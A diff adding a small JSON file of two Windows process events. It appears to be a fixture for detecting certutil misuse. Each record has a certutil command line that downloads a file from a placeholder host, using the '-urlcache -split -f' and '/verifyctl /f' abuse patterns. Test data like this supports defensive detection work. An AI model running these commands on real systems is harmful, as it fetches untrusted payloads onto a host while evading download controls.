@@ -1,0 +1,12 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "OriginalFileName": "CertUtil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f https://example.invalid/a.bin C:\\Users\\Public\\a.bin"
+  },
+  {
+    "Image": "C:\\Windows\\SysWOW64\\certutil.exe",
+    "OriginalFileName": "CertUtil.exe",
+    "CommandLine": "certutil /verifyctl /f http://192.0.2.10/b.bin"
+  }
+]
